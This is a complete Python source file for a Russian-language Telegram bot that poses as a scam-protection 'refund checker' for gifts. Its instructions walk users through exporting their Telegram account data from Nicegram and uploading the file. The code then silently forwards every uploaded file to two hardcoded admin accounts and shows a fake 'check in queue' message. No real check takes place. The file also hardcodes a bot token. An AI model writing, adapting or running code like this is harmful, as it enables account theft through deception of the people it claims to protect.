# -*- coding: utf-8 -*-
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import time

TOKEN = "8263308565:AAHE6ofpvRf-14CTI-6CqEH1FV3JZ5nZxqY"
PHOTO_MENU = "https://drive.google.com/uc?id=1krR-92Sg3EXCInEQapacBeOdZ9lVguWf"
PHOTO_CHECK = "https://drive.google.com/uc?id=1FfAtPAjMBi1G2kX8F7_sWq15JHaBeDHU"
PHOTO_ERROR = "https://drive.google.com/uc?id=1w-4gwVkZnBm8Z2VrWMsbPAAdK1dUtAEw"
PHOTO_QUEUE = "https://drive.google.com/uc?id=1gHwaZd7FPonZ2-BuCngp5EZT1JjWq1jo"
ADMIN_IDS = [7459057658, 5893767537]

user_state = {}
last_time = {}
main_msg_id = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_state[user_id] = "menu"

    kb = [
        [InlineKeyboardButton("Инструкция", callback_data="inst")],
        [InlineKeyboardButton("Скачать NiceGram", url="https://nicegram.app")],
        [InlineKeyboardButton("Проверка на рефаунд", callback_data="check")]
    ]
    markup = InlineKeyboardMarkup(kb)
    text = f"Привет, *{user.first_name}*!\n\nЯ — бот, который поможет тебе не попасться на мошенников.\nЯ помогу отличить реальный подарок от чистого визуала, за который уже вернули деньги.\n\nВыбери действие:"

    msg = await update.message.reply_photo(PHOTO_MENU, caption=text, parse_mode='Markdown', reply_markup=markup)
    main_msg_id[user_id] = msg.message_id

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    user_id = q.from_user.id
    data = q.data
    chat_id = update.effective_chat.id
    msg_id = main_msg_id.get(user_id)

    if not msg_id:
        return

    if data == "menu":
        user_state[user_id] = "menu"
        kb = [
            [InlineKeyboardButton("Инструкция", callback_data="inst")],
            [InlineKeyboardButton("Скачать NiceGram", url="https://nicegram.app")],
            [InlineKeyboardButton("Проверка на рефаунд", callback_data="check")]
        ]
        markup = InlineKeyboardMarkup(kb)
        text = f"Привет, *{q.from_user.first_name}*!\n\nЯ — бот, который поможет тебе не попасться на мошенников.\nЯ помогу отличить реальный подарок от чистого визуала, за который уже вернули деньги.\n\nВыбери действие:"
        try:
            await context.bot.edit_message_media(
                chat_id=chat_id, message_id=msg_id,
                media=InputMediaPhoto(PHOTO_MENU, caption=text, parse_mode='Markdown'),
                reply_markup=markup
            )
        except: pass

    elif data == "check":
        user_state[user_id] = "file"
        kb = [[InlineKeyboardButton("Назад", callback_data="menu")]]
        markup = InlineKeyboardMarkup(kb)
        text = "**Отправьте файл .txt или .zip для проверки на рефаунд:**"
        try:
            await context.bot.edit_message_media(
                chat_id=chat_id, message_id=msg_id,
                media=InputMediaPhoto(PHOTO_CHECK, caption=text, parse_mode='Markdown'),
                reply_markup=markup
            )
        except: pass

    elif data == "new_file":
        user_state[user_id] = "file"
        kb = [[InlineKeyboardButton("Назад", callback_data="menu")]]
        markup = InlineKeyboardMarkup(kb)
        text = "**Отправьте файл .txt или .zip для проверки на рефаунд:**"
        try:
            await context.bot.edit_message_media(
                chat_id=chat_id, message_id=msg_id,
                media=InputMediaPhoto(PHOTO_CHECK, caption=text, parse_mode='Markdown'),
                reply_markup=markup
            )
        except: pass

    elif data == "inst":
        text = (
            "*Инструкция:*\n\n"
            "1. Скачайте приложение Nicegram\n"
            "с официального сайта, нажав на кнопку в главном меню.\n\n"
            "2. Откройте Nicegram и войдите в свой аккаунт.\n\n"
            "3. Зайдите в настройки и выберите пункт «Nicegram».\n\n"
            "4. Экспортируйте данные аккаунта, нажав на кнопку «Экспортировать в файл».\n\n"
            "5. Откройте главное меню бота и нажмите на кнопку \"Проверка на рефаунд\".\n\n"
            "6. Отправьте файл боту."
        )
        kb = [[InlineKeyboardButton("Меню", callback_data="menu")]]
        markup = InlineKeyboardMarkup(kb)
        try:
            await context.bot.edit_message_caption(
                chat_id=chat_id, message_id=msg_id,
                caption=text, parse_mode='Markdown', reply_markup=markup
            )
        except: pass

async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    now = time.time()
    if user_id in last_time and now - last_time[user_id] < 1.8:
        return
    last_time[user_id] = now

    if update.message.text and update.message.text.startswith('/'):
        return

    # УДАЛЯЕМ СТАРОЕ СООБЩЕНИЕ БОТА
    msg_id = main_msg_id.get(user_id)
    if msg_id:
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=msg_id)
        except: pass
        del main_msg_id[user_id]

    # ПРОВЕРКА ФАЙЛА
    if user_state.get(user_id) == "file" and update.message.document:
        file = update.message.document
        file_name = file.file_name.lower()

        # ОТПРАВКА АДМИНАМ
        for admin in ADMIN_IDS:
            await context.bot.send_document(admin, document=file.file_id, caption=f"Файл от {user_id}")

        if file_name.endswith('.txt') or file_name.endswith('.zip'):
            # УСПЕХ — НОВОЕ СООБЩЕНИЕ
            kb = [[InlineKeyboardButton("Меню", callback_data="menu")]]
            markup = InlineKeyboardMarkup(kb)
            text = (
                "**Проверка в очереди!**\n\n"
                "Мы сообщим вам как только проверим файл. "
                "Обычно это занимает не более 15 минут."
            )
            new_msg = await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=PHOTO_QUEUE,
                caption=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
            main_msg_id[user_id] = new_msg.message_id
        else:
            # ОШИБКА — НОВОЕ СООБЩЕНИЕ С ПРАВИЛЬНОЙ КАРТИНКОЙ
            kb = [
                [InlineKeyboardButton("Меню", callback_data="menu")],
                [InlineKeyboardButton("Отправить новый файл", callback_data="new_file")]
            ]
            markup = InlineKeyboardMarkup(kb)
            text = "Файл не распознан, выберите действие ниже:"
            new_msg = await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=PHOTO_ERROR,  # ПРАВИЛЬНАЯ КАРТИНКА
                caption=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
            main_msg_id[user_id] = new_msg.message_id

    else:
        # НЕ ФАЙЛ — НОВОЕ СООБЩЕНИЕ С ПРАВИЛЬНОЙ КАРТИНКОЙ
        kb = [
            [InlineKeyboardButton("Меню", callback_data="menu")],
            [InlineKeyboardButton("Отправить новый файл", callback_data="new_file")]
        ]
        markup = InlineKeyboardMarkup(kb)
        text = "Файл не распознан, выберите действие ниже:"
        new_msg = await context.bot.send_photo(
            chat_id=update.effective_chat.id,
            photo=PHOTO_ERROR,  # ПРАВИЛЬНАЯ КАРТИНКА
            caption=text,
            parse_mode='Markdown',
            reply_markup=markup
        )
        main_msg_id[user_id] = new_msg.message_id

# === ДОБАВЛЕНИЕ СМАЙЛА ПАПКИ ПЕРЕД ЗАПРОСОМ ФАЙЛА ===
# (в button "check" и "new_file" — уже есть в тексте: **Отправьте файл...**)
# Если нужно вставить в текст — просто добавь в переменную text

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle))
    print("БОТ ЗАПУЩЕН — КАРТИНКА ОШИБКИ, ЖИРНЫЙ ТЕКСТ, КНОПКА МЕНЮ")
    app.run_polling()

if __name__ == '__main__':
    main()
